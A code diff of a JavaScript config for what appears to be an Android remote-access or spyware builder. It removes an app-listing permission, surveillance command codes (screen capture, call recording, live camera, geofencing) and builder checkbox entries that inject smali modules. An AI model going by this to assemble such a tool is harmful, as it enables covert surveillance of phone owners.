@@ -52,8 +52,7 @@ exports.permissions = [
   'android.permission.REQUEST_IGNORE_BATTERY_OPTIMISATIONS',
   'android.permission.POST_NOTIFICATIONS',
   'android.permission.SCHEDULE_EXACT_ALARM',
-  'android.permission.FOREGROUND_SERVICE',
-  'android.permission.QUERY_ALL_PACKAGES'
+  'android.permission.FOREGROUND_SERVICE'
 ];
 exports.checkboxMap = {
   Permissions1: [
@@ -170,58 +169,5 @@ exports.orders = {
   mic: 'x0000mc',
   location: 'x0000lm',
   contacts: 'x0000cn',
-  deviceInfo: 'x0000di',
-  installedApps: 'x0000ia',
-  screenCapture: 'x0000sc',
-  callRecording: 'x0000cr',
-  geofencing: 'x0000gf',
-  videoRecording: 'x0000vr',
-  liveCamera: 'x0000lc',
-  openUrl: 'x0000ou',
-}
 
-//---------------------Optional Features (Builder checkboxes)---------------
-exports.features = [
-  {
-    id: 'Feature1',
-    file: 'i.smali',
-    orderCode: 'x0000di',
-    label: 'Device Info'
-  },
-  {
-    id: 'Feature2',
-    file: 'j.smali',
-    orderCode: 'x0000ia',
-    label: 'Installed Apps'
-  },
-  {
-    id: 'Feature3',
-    file: 'k.smali',
-    orderCode: 'x0000sc',
-    label: 'Screen Capture'
-  },
-  {
-    id: 'Feature4',
-    file: 'l.smali',
-    orderCode: 'x0000cr',
-    label: 'Call Recording'
-  },
-  {
-    id: 'Feature5',
-    file: 'm.smali',
-    orderCode: 'x0000gf',
-    label: 'Geofencing'
-  },
-  {
-    id: 'Feature6',
-    file: 'n.smali',
-    orderCode: 'x0000vr',
-    label: 'Video Recording'
-  },
-  {
-    id: 'Feature7',
-    file: 'o.smali',
-    orderCode: 'x0000lc',
-    label: 'Live Camera'
-  }
-];
+}
